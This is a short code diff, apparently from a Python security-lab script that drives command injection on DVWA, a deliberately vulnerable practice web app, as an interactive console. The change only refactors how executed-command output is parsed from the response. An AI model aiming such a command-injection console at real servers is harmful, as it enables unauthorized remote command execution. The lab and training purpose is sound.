@@ -1,4 +1,4 @@
-from utils import COMMAND_INJECTION_URL, generar_session
+from utils import COMMAND_INJECTION_URL, generar_session, obtener_respuesta_dvwa
 import requests
 import re
 
@@ -18,9 +18,8 @@ def consola_por_command_injection(session: requests.Session) -> None:
                 'Submit': 'Submit'
             }
             res = session.post(COMMAND_INJECTION_URL, data=form)
-            match = re.search('<pre>(.*)</pre>', res.text, flags=re.DOTALL)
-            if match:
-                resultado_comando = match.group(1)
+            
+            if (resultado_comando:=obtener_respuesta_dvwa(res.text)) is not None:
                 print(resultado_comando)
             else:
                 print("Error o el comando no fue ejecutado correctamente.")
